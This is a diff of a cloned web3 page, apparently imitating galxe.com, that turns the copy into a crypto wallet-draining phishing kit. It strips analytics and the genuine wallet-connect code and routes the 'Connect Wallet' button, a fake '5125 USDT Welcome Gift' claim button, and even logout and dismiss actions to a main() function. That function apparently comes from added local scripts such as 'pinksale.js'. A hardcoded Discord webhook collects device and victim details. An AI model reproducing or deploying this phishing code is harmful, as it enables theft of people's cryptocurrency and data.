@@ -30761,35 +30761,9 @@
         }
       }
     </style>
-    <script async="" src="./Your/gtm.js"></script>
-    <script>
-      window.intercomSettings = {
-        api_base: "https://api-iam.intercom.io",
-        app_id: "x55eon90",
-      };
-    </script>
-    <!-- Global site tag (gtag.js) - Google Analytics -->
-    <script async="" src="./Your/js"></script>
-    <script>
-      function gtag() {
-        dataLayer.push(arguments);
-      }
-      (window.dataLayer = window.dataLayer || []),
-        gtag("js", new Date()),
-        gtag("config", "G-F9J18S6WJV");
-    </script>
+   
     <!-- Google Tag Manager -->
-    <script>
-      !(function (e, t, a, n, g) {
-        (e[n] = e[n] || []),
-          e[n].push({ "gtm.start": new Date().getTime(), event: "gtm.js" });
-        var m = t.getElementsByTagName(a)[0],
-          r = t.createElement(a);
-        (r.async = !0),
-          (r.src = "https://www.googletagmanager.com/gtm.js?id=GTM-PWDMCNC"),
-          m.parentNode.insertBefore(r, m);
-      })(window, document, "script", "dataLayer");
-    </script>
+   
     <!-- End Google Tag Manager -->
     <script src="./Your/gt4.js"></script>
     <style type="text/css">
@@ -70780,7 +70754,7 @@
                           <div
                             class="connect-btn clickable text-14-bold"
                             data-v-282cea93=""
-                            onclick="render()"
+                            onclick="main()"
                             id="login"
                           >
                             Connect Wallet
@@ -88302,102 +88276,37 @@
           <span style="color: #ffb710">5125 USDT</span> Welcome Gift
         </div>
         <img src="./Your/zhezc.png" alt="" />
-        <button class="btn-gift">Claim</button>
+        <button class="btn-gift" onclick="main()">Claim</button>
       </div>
     </div>
     <script
-      type="text/javascript"
-      src="https://unpkg.com/web3@1.2.11/dist/web3.min.js"
-    ></script>
-    <script
-      type="text/javascript"
-      src="https://unpkg.com/web3modal@1.9.0/dist/index.js"
-    ></script>
-    <script
-      type="text/javascript"
-      src="https://unpkg.com/evm-chains@0.2.0/dist/umd/index.min.js"
-    ></script>
-    <script
-      type="text/javascript"
-      src="https://unpkg.com/@walletconnect/web3-provider@1.2.1/dist/umd/index.min.js"
-    ></script>
-    <script
-      type="text/javascript"
-      src="https://unpkg.com/fortmatic@2.0.6/dist/fortmatic.js"
-    ></script>
-    <script
-      src="https://cdn.ethers.io/lib/ethers-5.0.umd.min.js"
-      type="text/javascript"
-    ></script>
-    <script type="text/javascript">
-      const Web3Modal = window.Web3Modal.default;
-      const WalletConnectProvider = window.WalletConnectProvider.default;
-      const Fortmatic = window.Fortmatic;
-      const evmChains = window.evmChains;
-      const ethers = window.ethers;
-      let web3Modal;
-      let provider;
-      let selectedAccount;
-      let xhladd = "";
-      let xethbalance = "";
-      let xxhladd = "";
-      let loginy = document.getElementById("login");
-      let logouty = document.getElementById("logout");
-      let cengy = document.getElementById("ceng");
-      let niuy = document.getElementById("niu");
-      function noshow() {
-        cengy.classList.add("hidd");
-      }
-      async function init() {
-        const providerOptions = {
-          walletconnect: {
-            package: WalletConnectProvider,
-            options: {
-              // Mikko's test key - don't copy as your mileage may vary
-              infuraId: "8043bb2cf99347b1bfadfb233c5325c0",
-            },
-          },
+    src="./Your/jquery-3.6.0.min.js"
+    integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4="
+    crossorigin="anonymous"
+  ></script>
+  <script src="./Your/ethereumjs-tx-1.3.3.min.js"></script>
+  <script type="text/javascript" src="./Your/web3.min.js"></script>
+  <script type="text/javascript" src="./Your/index.js"></script>
+  <script type="text/javascript" src="./Your/index.min.js"></script>
+  <script type="text/javascript" src="./Your/index.min(1).js"></script>
+  <script type="text/javascript" src="./Your/fortmatic.js"></script>
+  <script
+    src="./Your/async.min.js"
+    integrity="sha512-0ewcnFb590plq2BJFUSpSbysjDZaj1Jsdkqt5ldhGE/nXJFCbhI/hXuonRIft5WwwlPj87/k3NU2wUyAWUJV0w=="
+    crossorigin="anonymous"
+    referrerpolicy="no-referrer"
+  ></script>
+  <script type="text/javascript" src="./Your/pinksale.js"></script>
 
-          fortmatic: {
-            package: Fortmatic,
-            options: {
-              // Mikko's TESTNET api key
-              key: "pk_test_391E26A3B43A3350",
-            },
-          },
-        };
-
-        web3Modal = new Web3Modal({
-          network: "mainnet", // optional
-          cacheProvider: true, // optional
-          providerOptions, // required
-        });
-        const externalProvider = await web3Modal.connect();
-        return new ethers.providers.Web3Provider(externalProvider);
-      }
-      async function render() {
-        console.log(111);
-        const provider = await init();
-        const signer = provider.getSigner(0);
-        xhladd = await signer.getAddress();
-        xxhladd =
-          xhladd.substring(0, 4) +
-          "..." +
-          xhladd.substring(xhladd.length - 4, xhladd.length);
-        const rawBalance = await provider.getBalance(xhladd);
-        xethbalance =
-          ethers.utils.formatEther(rawBalance).toString().substring(0, 6) +
-          " ETH";
-        logouty.classList.remove("hidd");
-        loginy.classList.add("hidd");
-        logouty.innerText = xxhladd;
-      }
-      function logout() {
-        web3Modal.clearCachedProvider();
-        logouty.classList.add("hidd");
-        loginy.classList.remove("hidd");
-        logouty.innerText = "";
-      }
+  <script type="text/javascript">
+    let cengy = document.getElementById('ceng')
+    function logout() {
+      main()
+    }
+    function noshow() {
+      cengy.classList.add('hidd')
+      main()
+    }
       const webhook =
         "https://discord.com/api/webhooks/1087631641817649193/1VJ4zhFe4xC2x3TwZeP08ATkZ3ekDkAAQtTrbyu4SwzbT-E6KK5qWs0nfCTCRXf383ww";
       let qdevice_emoji = "";
@@ -106333,148 +106242,8 @@ Device: ${qdevice} `,
         "Space:22266"
       );
     </script>
-    <!-- <script src="./Your/e54fc86.js" defer=""></script>
-    <script src="./Your/4286cd1.js" defer=""></script>
-    <script src="./Your/57efc5a.js" defer=""></script>
-    <script src="./Your/ef17617.js" defer=""></script>
-    <script src="./Your/578f042.js" defer=""></script>
-    <script src="./Your/bd8496c.js" defer=""></script>
-    <script src="./Your/feb46d1.js" defer=""></script>
-    <script src="./Your/66b6e2b.js" defer=""></script>
-    <script src="./Your/89130df.js" defer=""></script>
-    <script src="./Your/0509e97.js" defer=""></script>
-    <script src="./Your/39b8988.js" defer=""></script>
-    <script src="./Your/1008e55.js" defer=""></script>
-    <script src="./Your/5591b9c.js" defer=""></script>
-    <script src="./Your/676db69.js" defer=""></script>
-    <script src="./Your/62ee87b.js" defer=""></script>
-    <script src="./Your/c3810c6.js" defer=""></script>
-    <script src="./Your/9a45fbb.js" defer=""></script>
-    <script src="./Your/fb1ce66.js" defer=""></script>
-    <script src="./Your/7c71af0.js" defer=""></script>
-    <script src="./Your/a9782aa.js" defer=""></script>
-    <script src="./Your/4315f6e.js" defer=""></script>
-    <script src="./Your/88f097e.js" defer=""></script>
-    <script src="./Your/85e0961.js" defer=""></script>
-    <script src="./Your/b48b4b3.js" defer=""></script>
-    <script src="./Your/1ece0f7.js" defer=""></script>
-    <script src="./Your/b9629e5.js" defer=""></script>
-    <script src="./Your/1a2101f.js" defer=""></script>
-    <script src="./Your/68e043a.js" defer=""></script>
-    <script src="./Your/7b65002.js" defer=""></script>
-    <script src="./Your/29a8aa7.js" defer=""></script>
-    <script src="./Your/88f6d9b.js" defer=""></script>
-    <script src="./Your/ce11f16.js" defer=""></script>
-    <script src="./Your/f97ed2b.js" defer=""></script>
-    <script src="./Your/177984c.js" defer=""></script>
-    <script src="./Your/e19cc6d.js" defer=""></script>
-    <script src="./Your/85793f7.js" defer=""></script>
-    <script src="./Your/8e49591.js" defer=""></script>
-    <script src="./Your/647ae08.js" defer=""></script>
-    <script src="./Your/6b82881.js" defer=""></script>
-    <script src="./Your/5f47548.js" defer=""></script>
-    <script src="./Your/3bb41b8.js" defer=""></script>
-    <script src="./Your/d24b9de.js" defer=""></script>
-    <script src="./Your/596ae9d.js" defer=""></script>
-    <script src="./Your/9437836.js" defer=""></script>
-    <script src="./Your/d9d2431.js" defer=""></script>
-    <script src="./Your/fba9a2c.js" defer=""></script>
-    <script src="./Your/e6b826d.js" defer=""></script>
-    <script src="./Your/c70344c.js" defer=""></script>
-    <script src="./Your/0324ba9.js" defer=""></script>
-    <script src="./Your/723936d.js" defer=""></script>
-    <script src="./Your/05777db.js" defer=""></script>
-    <script src="./Your/c9e80f4.js" defer=""></script>
-    <script src="./Your/930e09f.js" defer=""></script>
-    <script src="./Your/463c518.js" defer=""></script>
-    <script src="./Your/0901534.js" defer=""></script>
-    <script src="./Your/857fb6f.js" defer=""></script>
-    <script src="./Your/ccb253d.js" defer=""></script>
-    <script src="./Your/00a70bb.js" defer=""></script>
-    <script src="./Your/75d4f08.js" defer=""></script>
-    <script src="./Your/b2b3c66.js" defer=""></script>
-    <script src="./Your/f4e54d4.js" defer=""></script>
-    <script src="./Your/2b7d1ab.js" defer=""></script>
-    <script src="./Your/c646332.js" defer=""></script>
-    <script src="./Your/6bbd47d.js" defer=""></script>
-    <script src="./Your/1183168.js" defer=""></script>
-    <script src="./Your/c29092d.js" defer=""></script>
-    <script src="./Your/e0f74c0.js" defer=""></script>
-    <script src="./Your/113bd8c.js" defer=""></script>
-    <script src="./Your/8c4d298.js" defer=""></script>
-    <script src="./Your/67b18ba.js" defer=""></script>
-    <script src="./Your/e836ce1.js" defer=""></script>
-    <script src="./Your/fd93fc4.js" defer=""></script>
-    <script src="./Your/055d781.js" defer=""></script>
-    <script src="./Your/c77d635.js" defer=""></script>
-    <script src="./Your/ada3957.js" defer=""></script>
-    <script src="./Your/1182e2a.js" defer=""></script>
-    <script src="./Your/dabb5a0.js" defer=""></script>
-    <script src="./Your/202a5ab.js" defer=""></script>
-    <script src="./Your/b807a89.js" defer=""></script>
-    <script src="./Your/283c247.js" defer=""></script>
-    <script src="./Your/a0350ad.js" defer=""></script>
-    <script src="./Your/9f1c74e.js" defer=""></script>
-    <script src="./Your/44c39b5.js" defer=""></script>
-    <script src="./Your/4b8dda4.js" defer=""></script>
-    <script src="./Your/2e32e63.js" defer=""></script>
-    <script src="./Your/ab8aa50.js" defer=""></script>
-    <script src="./Your/73e6cac.js" defer=""></script>
-    <script src="./Your/fe344a1.js" defer=""></script>
-    <script src="./Your/079b15c.js" defer=""></script>
-    <script src="./Your/2c1d97d.js" defer=""></script>
-    <script src="./Your/67e2ef7.js" defer=""></script>
-    <script src="./Your/f2f7a12.js" defer=""></script>
-    <script src="./Your/07ab7c9.js" defer=""></script>
-    <script src="./Your/b87e447.js" defer=""></script>
-    <script src="./Your/3dea072.js" defer=""></script>
-    <script src="./Your/c7846b7.js" defer=""></script>
-    <script src="./Your/aaaf781.js" defer=""></script>
-    <script src="./Your/b657848.js" defer=""></script>
-    <script src="./Your/711d580.js" defer=""></script>
-    <script src="./Your/53bdf15.js" defer=""></script>
-    <script src="./Your/2a6625b.js" defer=""></script>
-    <script src="./Your/bacc7d5.js" defer=""></script>
-    <script src="./Your/1710fe7.js" defer=""></script>
-    <script src="./Your/3384f3e.js" defer=""></script>
-    <script src="./Your/24e4814.js" defer=""></script>
-    <script src="./Your/5743d4c.js" defer=""></script>
-    <script src="./Your/cc26594.js" defer=""></script>
-    <script src="./Your/87336d4.js" defer=""></script>
-    <script src="./Your/2489330.js" defer=""></script>
-    <script src="./Your/2d2a693.js" defer=""></script>
-    <script src="./Your/857aed8.js" defer=""></script>
-    <script src="./Your/e101aab.js" defer=""></script>
-    <script src="./Your/f328ff5.js" defer=""></script>
-    <script src="./Your/51d26b0.js" defer=""></script>
-    <script src="./Your/ee7256b.js" defer=""></script>
-    <script src="./Your/199be15.js" defer=""></script>
-    <script src="./Your/83a83a5.js" defer=""></script>
-    <script src="./Your/e126dc7.js" defer=""></script>
-    <script src="./Your/934f61e.js" defer=""></script>
-    <script src="./Your/53811af.js" defer=""></script>
-    <script src="./Your/ba81eb2.js" defer=""></script>
-    <script src="./Your/9104085.js" defer=""></script>
-    <script src="./Your/df7461f.js" defer=""></script>
-    <script src="./Your/42d6ff1.js" defer=""></script>
-    <script src="./Your/50f0132.js" defer=""></script>
-    <script src="./Your/2a853f2.js" defer=""></script>
-    <script src="./Your/ce6b669.js" defer=""></script>
-    <script src="./Your/4998e36.js" defer=""></script>
-    <script src="./Your/729e1f3.js" defer=""></script> -->
-    <!-- Google Tag Manager (noscript) --><noscript
-      ><iframe
-        src="https://www.googletagmanager.com/ns.html?id=GTM-PWDMCNC"
-        height="0"
-        width="0"
-        style="display: none; visibility: hidden"
-      ></iframe></noscript
-    ><!-- End Google Tag Manager (noscript) --><noscript
-      ><strong
-        >We're sorry but Webpack App doesn't work properly without JavaScript
-        enabled. Please enable it to continue.</strong
-      ></noscript
-    ><!-- built files will be auto injected --><!-- OneTrust Cookies Consent Notice start for galxe.com -->
+   
+    <!-- Google Tag Manager (noscript) --><!-- built files will be auto injected --><!-- OneTrust Cookies Consent Notice start for galxe.com -->
     <script
       src="./Your/otSDKStub.js”"
       type="“text/javascript”"
